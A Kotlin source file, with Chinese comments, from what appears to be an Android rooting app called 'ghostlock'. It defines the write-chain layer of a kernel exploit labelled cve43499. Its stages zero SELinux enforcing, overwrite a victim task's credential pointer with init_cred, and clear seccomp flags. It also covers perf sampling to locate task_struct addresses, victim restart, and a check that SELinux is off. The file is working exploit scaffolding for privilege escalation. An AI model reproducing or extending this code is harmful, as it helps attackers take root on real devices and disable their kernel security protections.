package com.ghostlock.app.backend.backends.cve43499.flow

import com.ghostlock.app.backend.backends.cve43499.lifecycle.Cve43499PlacementFacts
import com.ghostlock.app.data.cve43499.DebugWriteChainParameters
import com.ghostlock.app.data.cve43499.DebugPrimitiveKind

/**
 * 写链阶段 id（evidence token；与 legacy 阶段名对齐）。
 *
 * @property token 稳定可检索 token（`w1`/`w1b`/`w2`/`w2b`/`w3`）。
 * @note 阶段：R3d；W1b/W2b 是 legacy 的 multicast 专属阶段（见各自 KDoc）。
 */
internal enum class Cve43499WriteStageId(val token: String) {
    /** W1：SELinux enforcing 清零（Zero + preserve_child 值写）。 */
    W1("w1"),

    /** W1b：multicast 私有 scratch 修复（Zero leaf；target=W1 页基址+buffer_size）。 */
    W1B("w1b"),

    /** W2：victim cred 指针写（Credential 值写；target=task+cred）。 */
    W2("w2"),

    /** W2b：fast-repair（Zero leaf；target=init_cred alias+8）。 */
    W2_REPAIR("w2b"),

    /** W3：seccomp（TIF_SECCOMP/thread_info.flags 与 seccomp.mode 清零）。 */
    W3("w3"),
}

/**
 * 单次写事务的具名结局（Flow 只看 typed 结果，不感知 owner 细节）。
 *
 * @note 阶段：R3d；「Executed」只表示 Carrier 观察到物理写，不表达 uid/root。
 */
internal sealed interface Cve43499WriteTransactionStep {
    /**
     * 物理写成功（链保持打开，由调用方决定 closeChain 或保留）。
     *
     * @property facts 本事务 Placement 事实（下一阶段目标派生用）。
     * @property reclaimSends landing 实际 reclaim sendmsg 次数。
     * @property primitiveKind 实际绑定的 Carrier 种类 token。
     * @property consumerSuccess execute 回执内 consumer 成功计数。
     * @property carrierArmed Carrier 是否 arm。
     * @property carrierOperations Carrier 中性操作计数。
     * @property carrierLastStep Carrier 最后 step（失败定位）。
     * @property carrierLastErrno Carrier 最后 errno。
     * @property primitive 本次事务实际绑定的 Carrier 描述（victim↔Actor 绑定证据用）。
     */
    data class Executed(
        val facts: Cve43499PlacementFacts,
        val reclaimSends: Long,
        val primitiveKind: String,
        val consumerSuccess: Long,
        val carrierArmed: Boolean,
        val carrierOperations: Long,
        val carrierLastStep: Int,
        val carrierLastErrno: Int,
        val primitive: com.ghostlock.app.jni.Native43499PrimitiveSpec,
    ) : Cve43499WriteTransactionStep

    /**
     * 路由 clean failure（本次写没有观察到有效写；可重试）。
     *
     * @property reason 具名原因（含 stage/失败位置）。
     * @property primitiveKind 若已绑定 Carrier 则给出种类 token。
     */
    data class RouteMiss(
        val reason: String,
        val primitiveKind: String?,
    ) : Cve43499WriteTransactionStep

    /**
     * 不可重试失败（dirty/receipt-incomplete/前置输入缺失/写链不变量破坏）。
     *
     * @property reason 具名原因。
     * @property retained 是否留下 Native 保留闭包（dirty）。
     */
    data class Failed(
        val reason: String,
        val retained: Boolean,
    ) : Cve43499WriteTransactionStep
}

/**
 * 写事务执行器 seam：`(写请求) -> 一次 placement→landing→actor 事务`。
 *
 * @note 阶段：R3d；实现（[Cve43499WriteTransactionRunner]）属 Flow 层，只调用唯一
 *   生命周期层，不触 Native JNI。
 */
internal fun interface Cve43499WriteTransactionExecutor {
    /**
     * 执行一次写事务（成功时链保持打开）。
     *
     * @param stage 阶段 id（证据/失败定位）。
     * @param request 本事务写请求（target/mode/preserveChild）。
     * @return 具名结局。
     */
    fun execute(
        stage: Cve43499WriteStageId,
        request: com.ghostlock.app.backend.backends.cve43499.generator.Cve43499WriteRequest,
    ): Cve43499WriteTransactionStep
}

/**
 * 采样时的 victim 身份基线（R3e/R2）：W2 前置校验用它对比「当前」身份。
 *
 * @property pid victim 子进程主线程 PID（采样前快照）。
 * @property startTimeTicks `/proc/<pid>/stat` 第 22 字段（fork 后不变；重启即变）。
 * @property uidProbe 采样前 uid 探测结果（非 null 且非 0 才可作为写后归因基线）。
 * @note 阶段：R3e-2；baseline 由 Flow 在 acquire 前捕获并随 evidence 返回。
 */
internal data class Cve43499VictimBaseline(
    val pid: Int,
    val startTimeTicks: Long,
    val uidProbe: Long?,
)

/**
 * 一次 address acquisition 的调用上下文（Flow 提供；实现不得缓存/跨 run 复用）。
 *
 * @property baseline 采样前 victim 身份基线。
 * @property pump 在 perf 采样窗口内驱动 victim 执行内核态代码：返回 null=完成，
 *   否则为具名失败原因（复用既有 `victimUid()` 的 `probe→id -u` 流，不改 victim）。
 * @note 阶段：R3e-2；pump 只在 Native open→collect 之间调用。
 */
internal class Cve43499VictimContext(
    val baseline: Cve43499VictimBaseline,
    val pump: (iterations: Long, budgetNanos: Long) -> String?,
)

/**
 * acquisition 的物理证据（Kotlin 解析/投票事实；可证伪、不表达成功主张）。
 *
 * @property baseline 采样时基线（W2 precheck 的唯一比对来源）。
 * @property passes 完成的 pass 数（2..3）。
 * @property passAddresses 每个 pass 的 winner（诊断/证据）。
 * @property votes 2-of-3 选中地址在**同意 pass** 中的票数合计。
 * @property candidates 同意 pass 的候选数合计（agree_candidates）。
 * @property threshold `max(min_votes_floor, ceil(min_votes_ratio×candidates))`。
 * @property spVotes 选中地址在 sp 下标出现的次数合计。
 * @property alignmentOk 选中地址是否满足 task_alignment（0=不启用则 true）。
 * @property spEvidenceOk spVotes>=1（仅 evidence，除非 require_sp_evidence=1）。
 * @property requireAlignment/requireSpEvidence 采集时生效的硬校验开关。
 * @property settleUs 取址成功后的有界 settle（W2 前）。
 * @property closeRetained close 失败/retained（不影响地址有效性）。
 * @note 阶段：R3e-2。
 */
internal data class Cve43499TargetEvidence(
    val baseline: Cve43499VictimBaseline,
    val passes: Int,
    val passAddresses: List<Long>,
    val votes: Long,
    val candidates: Long,
    val threshold: Long,
    val spVotes: Long,
    val alignmentOk: Boolean,
    val spEvidenceOk: Boolean,
    val requireAlignment: Boolean,
    val requireSpEvidence: Boolean,
    val settleUs: Long,
    val closeRetained: Boolean,
) {
    /**
     * @return 证据是否满足目标信任条件（W2 precheck 的 target-untrusted 判据）。
     * @note 这里只复核 acquisition 已给出的结论，不重新投票；任何字段不一致即拒绝。
     */
    internal fun trusted(): Boolean =
        passes in 2..3 &&
            votes >= threshold &&
            threshold > 0L &&
            candidates >= 1L &&
            (!requireAlignment || alignmentOk) &&
            (!requireSpEvidence || spEvidenceOk)
}

/**
 * acquisition 的结局：地址+证据，或具名失败（Flow 拼 `write-targets-missing:`）。
 *
 * @note 阶段：R3e-2；不写固定地址/不猜/不 fallback。
 */
internal sealed interface Cve43499TargetAcquisition {
    /** 取得可信地址。 */
    data class Acquired(
        val victimTaskAddress: Long,
        val evidence: Cve43499TargetEvidence,
    ) : Cve43499TargetAcquisition

    /**
     * 无法取得可信地址；reason 稳定可检索（`perf-*`）。
     *
     * @property closeRetained 取址过程中是否有 perf close 失败导致 retained（B9；
     *   不否定失败原因，只透传资源记账事实）。
     */
    data class Missing(
        val reason: String,
        val closeRetained: Boolean = false,
    ) : Cve43499TargetAcquisition
}

/**
 * victim 内核 task_struct 地址源（R3e 目标 seam；缺失即 fail-closed）。
 *
 * 物理来源：Native 无状态 perf 原语（3 入口，机制-only）+ Kotlin 解析/投票/校验
 * （见 [com.ghostlock.app.backend.backends.cve43499.perf]）。legacy 的 victim 内
 * `perf_find_task()` 由「App 进程跨任务采样 + 复用既有 uid probe pump」替代。
 *
 * @note 阶段：R3e-2；未注入 ⇒ 多写链不启用（默认单 W1）；注入但 Missing ⇒ W2/W3
 *       具名 fail-closed（`write-targets-missing:<reason>`）。
 */
internal fun interface Cve43499WriteTargetSource {
    /**
     * @param context 采样前基线 + pump（Flow 提供）。
     * @return Acquired（地址+证据）或 Missing（具名原因）。
     */
    fun acquire(context: Cve43499VictimContext): Cve43499TargetAcquisition
}

/**
 * 写请求规划 seam（R3d）：由 debug 目标事实派生每个阶段的具体写请求。
 *
 * 所有 target 都按 legacy 目标式派生（W1b=W1 页基址+buffer_size、W2=task+cred、
 * W2b=init_cred+8、W3=task+comm/flags/seccomp）；派生失败（溢出/缺参）抛
 * [com.ghostlock.app.backend.backends.cve43499.generator.Cve43499GeneratorException]。
 *
 * @note 阶段：R3d；实现在 generator 层（纯函数），Flow 只消费请求。
 */
internal interface Cve43499WritePlanner {
    /** @return W1 写请求（Zero + preserve_child）。 */
    fun w1(): com.ghostlock.app.backend.backends.cve43499.generator.Cve43499WriteRequest

    /**
     * @param w1PageBase W1 事务的候选页基址。
     * @return W1b 私有 scratch 修复请求（Zero leaf）。
     */
    fun w1b(w1PageBase: Long): com.ghostlock.app.backend.backends.cve43499.generator.Cve43499WriteRequest

    /**
     * @param victimTaskAddress victim 内核 task_struct 地址。
     * @return W2 凭据写请求（Credential + preserve_child）。
     */
    fun credential(
        victimTaskAddress: Long,
    ): com.ghostlock.app.backend.backends.cve43499.generator.Cve43499WriteRequest

    /** @return fast-repair 写请求（init_cred+8，Zero leaf）。 */
    fun fastRepair(): com.ghostlock.app.backend.backends.cve43499.generator.Cve43499WriteRequest

    /**
     * @param victimTaskAddress victim 内核 task_struct 地址。
     * @return W3-0 leaf 方向探针写请求（task+comm，Zero leaf）。
     */
    fun w3CommProbe(
        victimTaskAddress: Long,
    ): com.ghostlock.app.backend.backends.cve43499.generator.Cve43499WriteRequest

    /**
     * @param victimTaskAddress victim 内核 task_struct 地址。
     * @param leafToTargetPlus8 leaf 写是否落在 target+8（探针结果）。
     * @param threadInfoFlagsOffset task_struct 内 thread_info.flags 偏移。
     * @return W3 TIF_SECCOMP/thread_info.flags 清零请求（Zero leaf）。
     */
    fun w3Flags(
        victimTaskAddress: Long,
        leafToTargetPlus8: Boolean,
        threadInfoFlagsOffset: Long,
    ): com.ghostlock.app.backend.backends.cve43499.generator.Cve43499WriteRequest

    /**
     * @param victimTaskAddress victim 内核 task_struct 地址。
     * @param leafToTargetPlus8 leaf 写是否落在 target+8（探针结果）。
     * @return W3 seccomp.mode 清零请求（Zero leaf）。
     */
    fun w3SeccompMode(
        victimTaskAddress: Long,
        leafToTargetPlus8: Boolean,
    ): com.ghostlock.app.backend.backends.cve43499.generator.Cve43499WriteRequest
}

/** victim 重新生成 seam（legacy W3 链轮次 >1 需要 root child 置换/重生成）。 */
internal fun interface Cve43499VictimRestarter {
    /**
     * 重新生成 victim 会话并返回新 victim 的 task_struct 地址。
     *
     * @param lifecycle 本次运行的唯一生命周期层（实现负责 close→start 与重新取地址）。
     * @return 新 victim task 地址；null 表示无法重生成（不得继续链轮次）。
     */
    fun restart(lifecycle: com.ghostlock.app.backend.backends.cve43499.lifecycle.Cve43499LifecycleApi): Long?
}

/**
 * 单阶段写验收结论。
 *
 * @note 阶段：R3d；不表达业务成功主张，只表达「该阶段物理判据是否成立」。
 */
internal enum class Cve43499WriteVerifyVerdict {
    /** 判据成立。 */
    VERIFIED,

    /** 判据不成立（可重试）。 */
    UNVERIFIED,

    /** 本环境/本批无可用判据（不得重试、不得宣称成功）。 */
    UNSUPPORTED,
}

/**
 * W3 leaf 方向（legacy `W3-0: leaf dir` 探针结果）。
 *
 * leaf 写（`{pc=target-8,0,0}`）在部分 route 上会落在 `target+8`；探针决定 W3
 * 真正目标是否要减 8（legacy `w3_context.leaf_to_target8`）。
 */
internal enum class Cve43499LeafDirection {
    /** leaf 写恰好落在 target。 */
    EXACT,

    /** leaf 写落在 target+8（W3 目标需 -8）。 */
    TARGET_PLUS_8,
}

/**
 * 写阶段验收 seam（W1 SELinux / W3 leaf 方向与 seccomp 探针）。
 *
 * 默认实现（[Cve43499UnsupportedWriteVerifier]）对所有判据返回 UNSUPPORTED：
 * - W1 需要读 `/sys/fs/selinux/enforce`（Kotlin 可做，但非本 seams 默认）；
 * - W3 需要 victim 协议 'M'(comm 探针)/'F'(finit_module 探针) 命令，当前
 *   `ProcessVictimSession` 不支持（victim/ 不在 R3d 写范围）⇒ 具名 fail-closed。
 *
 * @note 阶段：R3d；生产默认 W1 由 [Cve43499AndroidWriteVerifier] 提供，W3 保持
 *   UNSUPPORTED（P0c 前置阻断）。
 */
internal interface Cve43499WriteVerifier {
    /** @return W1 物理判据（SELinux 已非 enforcing）。 */
    fun verifyW1(): Cve43499WriteVerifyVerdict

    /**
     * @return W1 判据 UNSUPPORTED 的具名原因（evidence `w1VerifyReason`）；null=无。
     * @note 默认 null；实现可给出“enforce-unreadable/verifier-unsupported”等可检索原因。
     */
    fun w1UnsupportedReason(): String? = null

    /** @return W3 leaf 方向；null 表示当前无探针能力。 */
    fun leafDirection(): Cve43499LeafDirection?

    /** @return W3 物理判据（victim 已无 seccomp filter）。 */
    fun verifyW3(): Cve43499WriteVerifyVerdict
}

/** 默认验收口：所有判据 UNSUPPORTED（不猜、不伪成功）。 */
internal object Cve43499UnsupportedWriteVerifier : Cve43499WriteVerifier {
    override fun verifyW1(): Cve43499WriteVerifyVerdict = Cve43499WriteVerifyVerdict.UNSUPPORTED

    override fun w1UnsupportedReason(): String = "verifier-unsupported"

    override fun leafDirection(): Cve43499LeafDirection? = null

    override fun verifyW3(): Cve43499WriteVerifyVerdict = Cve43499WriteVerifyVerdict.UNSUPPORTED
}

/**
 * W1 的 Android 判据实现：读 `/sys/fs/selinux/enforce`。
 *
 * - 读到 `0` ⇒ VERIFIED；
 * - 读到非 `0` ⇒ UNVERIFIED（可重试）；
 * - 读取失败/文件不存在 ⇒ UNSUPPORTED（不猜；legacy `check_selinux_off` 同语义：
 *   不可读时按 enforcing 处理）。
 *
 * @param enforcePath enforce 文件路径（宿主验证可注入临时文件）。
 * @note 阶段：R3d；W3 判据不在此实现（无 victim 探针协议）。
 */
internal class Cve43499AndroidWriteVerifier(
    private val enforcePath: String = DEFAULT_ENFORCE_PATH,
) : Cve43499WriteVerifier {
    /** 最近一次 W1 判据 UNSUPPORTED 的具名原因（`null`=无失效）。 */
    private var lastUnsupportedReason: String? = null

    override fun verifyW1(): Cve43499WriteVerifyVerdict {
        val text = runCatching { java.io.File(enforcePath).readText() }.getOrNull()
        if (text == null) {
            lastUnsupportedReason = "enforce-unreadable"
            return Cve43499WriteVerifyVerdict.UNSUPPORTED
        }
        val value = text.trim().toIntOrNull()
        if (value == null) {
            lastUnsupportedReason = "enforce-unparseable"
            return Cve43499WriteVerifyVerdict.UNSUPPORTED
        }
        lastUnsupportedReason = null
        return if (value == 0) {
            Cve43499WriteVerifyVerdict.VERIFIED
        } else {
            Cve43499WriteVerifyVerdict.UNVERIFIED
        }
    }

    override fun w1UnsupportedReason(): String? = lastUnsupportedReason

    override fun leafDirection(): Cve43499LeafDirection? = null

    override fun verifyW3(): Cve43499WriteVerifyVerdict = Cve43499WriteVerifyVerdict.UNSUPPORTED

    companion object {
        /** SELinux enforce 节点的生产路径。 */
        internal const val DEFAULT_ENFORCE_PATH: String = "/sys/fs/selinux/enforce"
    }
}

/**
 * 多写链的轮次/等待策略（由 debug 参数解析而来；Flow 不内置目标常量）。
 *
 * @property w1Attempts W1 尝试次数（multicast 由调用方固定为 1）。
 * @property w1bWrites W1b 私有 scratch 修复尝试次数。
 * @property w1bEnabled 是否执行 W1b（legacy：仅 multicast）。
 * @property w2Attempts W2 凭据写尝试次数。
 * @property fastRepairEnabled 是否执行 fast-repair（legacy：仅 multicast）。
 * @property w3ChainRounds W2/W3 链轮次上限（>1 需 victim restarter）。
 * @property w3ExactTarget W3 的 leaf 写是否精确命中 target（legacy：仅 tcp）。
 * @property threadInfoFlagsOffset task_struct 内 thread_info.flags 偏移。
 * @property fastRepairSetupSettleUs fast-repair 事务的 setup settle。
 * @property fastRepairParkedTimeoutNanos fast-repair 事务的 waiter 等待窗口。
 * @property fastRepairLockPiSpinNs fast-repair 事务的 PI 自旋上限。
 * @property attemptBackoffUs clean failure 后的退避。
 * @property verifyBackoffUs 验收未过后的退避。
 * @property fastRepairPrebuildEnabled G05：W1 出口预建 repair placement+landing（默认 false=零行为变化）。
 * @property allowFullFallback G05：prebuild clean failure 后是否允许 W2 完整 fallback（默认 false）。
 */
internal data class Cve43499WriteChainPolicy(
    val w1Attempts: Int,
    val w1SettleUs: Long,
    val w1bEnabled: Boolean,
    val w1bWrites: Int,
    val w1bSettleUs: Long,
    val w2Attempts: Int,
    val w2SettleUs: Long,
    val fastRepairEnabled: Boolean,
    val fastRepairSetupSettleUs: Long,
    val fastRepairParkedTimeoutNanos: Long,
    val fastRepairLockPiSpinNs: Long,
    val w3ChainRounds: Int,
    val w3Attempts: Int,
    val w3SettleUs: Long,
    val w3LeafProbeAttempts: Int,
    val w3LeafProbeSettleUs: Long,
    val w3ExactTarget: Boolean,
    val threadInfoFlagsOffset: Long,
    val attemptBackoffUs: Long,
    val verifyBackoffUs: Long,
    /* G05（append-only；默认 false ⇒ 与既有行为完全一致）。 */
    val fastRepairPrebuildEnabled: Boolean = false,
    val allowFullFallback: Boolean = false,
) {
    /** @return 具名自洽失败原因；null 表示策略合法（Native/Flow 前置校验）。 */
    internal fun validate(): String? {
        if (w1Attempts < 1 || w1bWrites < 1 || w2Attempts < 1 ||
            w3ChainRounds < 1 || w3Attempts < 1 || w3LeafProbeAttempts < 1
        ) {
            return "write-chain:attempts"
        }
        if (w1SettleUs < 0L || w1bSettleUs < 0L || w2SettleUs < 0L ||
            w3SettleUs < 0L || w3LeafProbeSettleUs < 0L ||
            attemptBackoffUs < 0L || verifyBackoffUs < 0L ||
            fastRepairSetupSettleUs < 0L
        ) {
            return "write-chain:settle"
        }
        if (fastRepairParkedTimeoutNanos <= 0L ||
            fastRepairLockPiSpinNs <= 0L ||
            /* 与 Native actor_setup 校验同形：spin 不得大于等待窗口。 */
            fastRepairLockPiSpinNs > fastRepairParkedTimeoutNanos
        ) {
            return "write-chain:fast-repair-timing"
        }
        if (threadInfoFlagsOffset < 0L) return "write-chain:thread-info-flags-offset"
        /* G05：prebuild 只在 fast-repair 路由启用时自洽。 */
        if (fastRepairPrebuildEnabled && !fastRepairEnabled) {
            return "write-chain:fast-repair-prebuild"
        }
        return null
    }

    companion object {
        /**
         * 由 debug 参数 + 单 route 选择构造策略。
         *
         * @param parameters debug 多写链参数。
         * @param primitive 本次注入的 Primitive 种类（决定 W1b/W3 的 legacy 特化）。
         * @return 策略；multicast 的 W1 尝试次数按 legacy 固定为 1。
         */
        internal fun fromDebug(
            parameters: DebugWriteChainParameters,
            primitive: DebugPrimitiveKind,
        ): Cve43499WriteChainPolicy = Cve43499WriteChainPolicy(
            /* legacy `w1<M>`：multicast 的 w1_attempts 强制为 1
             * （"a non-resident multicast write cannot safely retry a missed W1"）。 */
            w1Attempts = if (primitive == DebugPrimitiveKind.MULTICAST) {
                1
            } else {
                parameters.w1Attempts
            },
            w1SettleUs = parameters.w1SettleUs,
            w1bEnabled = primitive == DebugPrimitiveKind.MULTICAST,
            w1bWrites = parameters.w1bAttempts,
            w1bSettleUs = parameters.w1bSettleUs,
            w2Attempts = parameters.w2Attempts,
            w2SettleUs = parameters.w2SettleUs,
            fastRepairEnabled = primitive == DebugPrimitiveKind.MULTICAST,
            fastRepairSetupSettleUs = parameters.fastRepairSettleUs,
            fastRepairParkedTimeoutNanos = parameters.fastRepairParkedTimeoutNanos,
            fastRepairLockPiSpinNs = parameters.fastRepairLockPiSpinNs,
            w3ChainRounds = parameters.w3ChainRounds,
            w3Attempts = parameters.w3Attempts,
            w3SettleUs = parameters.w3SettleUs,
            w3LeafProbeAttempts = parameters.w3LeafProbeAttempts,
            w3LeafProbeSettleUs = parameters.w3LeafProbeSettleUs,
            w3ExactTarget = primitive == DebugPrimitiveKind.TCP_ZEROCOPY,
            threadInfoFlagsOffset = parameters.threadInfoFlagsOffset,
            attemptBackoffUs = parameters.attemptBackoffUs,
            verifyBackoffUs = parameters.verifyBackoffUs,
            fastRepairPrebuildEnabled = parameters.fastRepairPrebuildEnabled,
            allowFullFallback = parameters.allowFullFallback,
        )
    }
}

/**
 * R3d 多写链的全部显式输入（激活条件：注入本对象）。
 *
 * @property targetSource victim task 地址源（缺失即 W2/W3 fail-closed）。
 * @property planner 写请求规划 seam（每阶段 target/mode/preserve_child 派生）。
 * @property policy 轮次/等待策略。
 * @property primitiveToken 本次注入的 Primitive token（证据用；不参与判定）。
 * @property verifier 阶段验收口（默认 UNSUPPORTED）。
 * @property victimRestarter 链轮次>1 的 victim 重生成 seam；null ⇒ 链轮次固定 1。
 * @note 阶段：R3d；不注入时 Flow 保持 R3b 单 W1 行为（兼容路径）。
 */
internal data class Cve43499WriteChain(
    val targetSource: Cve43499WriteTargetSource,
    val planner: Cve43499WritePlanner,
    val policy: Cve43499WriteChainPolicy,
    val primitiveToken: String,
    val verifier: Cve43499WriteVerifier = Cve43499UnsupportedWriteVerifier,
    val victimRestarter: Cve43499VictimRestarter? = null,
)
